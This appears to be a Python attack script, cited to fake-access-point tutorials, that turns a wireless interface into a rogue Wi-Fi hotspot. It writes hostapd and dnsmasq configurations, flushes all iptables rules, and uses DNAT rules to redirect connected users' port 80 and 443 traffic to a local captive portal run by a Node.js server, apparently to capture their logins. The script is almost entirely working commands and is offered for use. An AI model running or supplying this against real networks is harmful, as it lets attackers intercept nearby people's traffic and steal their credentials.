import os
import sys


def openAP(net_ssid,net_channel,internet_interface,interface):

    # Source: https://hakin9.org/create-a-fake-access-point-by-anastasis-vasileiadis/
    # Source: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/
    # Source: https://andrewwippler.com/2016/03/11/wifi-captive-portal/
    # Source: https://unix.stackexchange.com/questions/132130/iptables-based-redirect-captive-portal-style

    # enable monitor mode
    os.system(f'sudo ifconfig {interface} down')
    os.system(f'sudo iwconfig {interface} mode monitor')
    os.system(f'sudo ifconfig {interface} up')

    # Disable all old proccess
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')

    # Clear port 53
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')


    # Create configuration files
    conf_text = f"interface={interface}\ndriver=nl80211\nssid={net_ssid}"\
    f"\nchannel={net_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"\
    "wme_enabled=1"
    conf_file = open("hostapd.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()

    conf_text = f"interface={interface}\ndhcp-range=192.168.24.25,192.168.24.50,255.255.255.0,12h"\
    "\ndhcp-option=3,192.168.24.1\ndhcp-option=6,192.168.24.1"\
    f"\nlog-queries\nlog-dhcp\n"\
        # \nlisten-address=127.0.0.1
        # address=/#/192.168.24.1\n
    # ""
    conf_file = open("dnsmasq.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()


    # AP with address 192.168.24.1 on the given interface
    os.system(f"ifconfig {interface} up 192.168.24.1 netmask 255.255.255.0")

    # Clear all IP Rules
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    
    # Allowing packets forwarding through the network.
    os.system('iptables -P FORWARD ACCEPT')

    # Redirect any request to the captive portal
    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 80 -j DNAT  --to-destination 192.168.24.1')
    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 443 -j DNAT  --to-destination 192.168.24.1')

    # Enable internet access use the second interface
    os.system(f'iptables -t nat -A POSTROUTING --out-interface {internet_interface} -j MASQUERADE')
    os.system(f'iptables -A FORWARD --in-interface {interface} -j ACCEPT')
    
    # Enable IP forwarding from one interface to another
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Change defualt port for capital portal to port 70;
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 70')


    # Link dnsmasq to the configuration file.
    os.system("dnsmasq -C dnsmasq.conf")

    # Running the web server 
    os.system('service apache2 start')
    os.system('gnome-terminal -- sh -c "sudo node web/html/index.js;"$SHELL')

    # Link hostpad to the configuration file.
    os.system("hostapd hostapd.conf")


    # Reset all setting to defualt
    os.system("systemctl enable systemd-resolved.service >/dev/null 2>&1") 
    os.system("systemctl start systemd-resolved >/dev/null 2>&1") 
    os.system("sudo rm /etc/resolv.conf")
    os.system("sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf")



if __name__ == "__main__":

    openAP(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
